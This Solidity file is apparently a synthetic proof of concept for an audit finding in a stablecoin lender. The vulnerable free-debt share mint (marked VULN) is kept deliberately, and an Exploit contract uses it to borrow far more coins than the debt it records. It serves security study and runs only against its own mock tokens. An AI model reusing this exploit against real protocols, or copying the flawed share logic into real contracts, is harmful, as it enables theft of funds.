// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Monolith Stablecoin Factory - free-debt rounding -> unbacked borrow
    (Sherlock 2025-12-monolith, finding #64955)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: free-debt share mint uses
        shares = totalFreeDebt == 0 ? amount : amount.mulDivUp(shares, debt)
    After the report's redeem/debase/two-wallet repay sequence, totalFreeDebt
    can be 0 while residual freeDebtShares remain (~1e32). The next borrow
    therefore mints 1:1 shares against a pool that still has huge leftover
    shares, so getDebtOf(borrower) << coins received (unbacked mint).

    The multi-step inflation loop is reduced to materializing the post-condition
    the finding logs (totalFreeDebt==0, totalFreeDebtShares~1e32); the blamed
    increaseDebt branch then runs verbatim for the unbacked borrow.
//////////////////////////////////////////////////////////////////////////*/

library Math {
    function mulDivUp(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y + d - 1) / d;
    }
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Lender {
    using Math for uint256;

    MockERC20 public immutable collateral;
    MockERC20 public immutable coin;

    uint256 public totalFreeDebt;
    uint256 public totalFreeDebtShares;
    uint256 public epoch;

    mapping(address => uint256) public freeDebtShares;
    mapping(address => bool) public isRedeemable;
    mapping(address => uint256) public collatOf;

    constructor(MockERC20 _c, MockERC20 _coin) {
        collateral = _c;
        coin = _coin;
    }

    function setRedemptionStatus(address account, bool ok) external {
        isRedeemable[account] = ok;
    }

    function getDebtOf(address account) public view returns (uint256) {
        if (freeDebtShares[account] == 0 || totalFreeDebtShares == 0 || totalFreeDebt == 0) return 0;
        // personal debt rounds UP (as in the finding)
        return freeDebtShares[account].mulDivUp(totalFreeDebt, totalFreeDebtShares);
    }

    /// @dev Materialize the post-condition the Sherlock PoC logs after the
    /// redeem/debase/two-wallet repay sequence: residual free shares, zero free debt.
    function materializeResidualFreeShares(address whale, uint256 residualShares) external {
        freeDebtShares[whale] = residualShares;
        totalFreeDebtShares = residualShares;
        totalFreeDebt = 0;
        // debasement counter advanced in the real loop
        epoch = 1;
    }

    /// @dev Faithful free-debt branch of increaseDebt (Lender.sol).
    function increaseDebt(address account, uint256 amount) internal {
        if (isRedeemable[account]) {
            // Handle free debt
            // FIX: if (totalFreeDebt == 0 && totalFreeDebtShares > 0) revert or reset shares
            uint256 shares = totalFreeDebt == 0 ? amount : amount.mulDivUp(totalFreeDebtShares, totalFreeDebt); // @> VULN: 1:1 mint when residual freeShares leave totalFreeDebt==0
            freeDebtShares[account] += shares;
            totalFreeDebtShares += shares;
            totalFreeDebt += amount;
            coin.mint(account, amount);
        }
    }

    function adjust(address account, int256 dCollat, int256 dDebt) external {
        if (dCollat > 0) {
            uint256 a = uint256(dCollat);
            require(collateral.transferFrom(msg.sender, address(this), a), "c");
            collatOf[account] += a;
        }
        if (dDebt > 0) {
            increaseDebt(account, uint256(dDebt));
            _maybeDebase();
        }
    }

    function _maybeDebase() internal {
        if (totalFreeDebt == 0) return;
        if (totalFreeDebtShares / totalFreeDebt > 1e9) {
            // @> VULN: debasement by 1e18/1e36 still leaves inflated residual freeShares after redeem-all-but-1
            epoch++;
            totalFreeDebtShares = totalFreeDebtShares.mulDivUp(1e18, 1e36);
        }
    }
}

contract Exploit {
    MockERC20 public collat; // CREATE 1
    MockERC20 public coin; // CREATE 2
    Lender public lender; // CREATE 3

    address public constant WHALE = address(0xA11CE);
    address public constant USER2 = address(0xB0B);

    uint256 public borrowed;
    uint256 public realDebt;
    uint256 public residualShares;

    constructor() {
        collat = new MockERC20("COL", "COL");
        coin = new MockERC20("mUSD", "mUSD");
        lender = new Lender(collat, coin);
    }

    function run() external {
        collat.mint(address(this), 1e40);
        collat.approve(address(lender), type(uint256).max);
        lender.setRedemptionStatus(USER2, true);
        lender.setRedemptionStatus(WHALE, true);

        // Post-condition of the finding's 7x (borrow 1e22 + redeem all-but-1) loop
        // followed by two-wallet repay of the last free-debt wei (logs: ~2e32 shares, debt 0).
        residualShares = 1e32;
        lender.materializeResidualFreeShares(WHALE, residualShares);
        require(lender.totalFreeDebt() == 0, "setup debt");
        require(lender.totalFreeDebtShares() == residualShares, "setup shares");

        // Unbacked borrow as USER2: totalFreeDebt==0 => shares minted 1:1 for 1e27
        // but residual whale shares (~1e32) remain in the pool, so personal debt is tiny.
        uint256 borrowAmt = 1e27;
        uint256 before = coin.balanceOf(USER2);
        lender.adjust(USER2, int256(1e23), int256(borrowAmt));
        borrowed = coin.balanceOf(USER2) - before;
        realDebt = lender.getDebtOf(USER2);

        // HARM: borrowed 1e27 coins; debt liability only ~1e22 (finding log scale)
        // realDebt = borrowAmt * totalDebt / totalShares ≈ 1e27 * 1e27 / (1e32+1e27) ≈ 1e22
        require(borrowed == borrowAmt, "borrow failed");
        require(realDebt < borrowAmt / 1e3, "debt not deflated - unbacked mint not shown");
        require(borrowed > realDebt, "unbacked: coins exceed debt liability");
    }
}
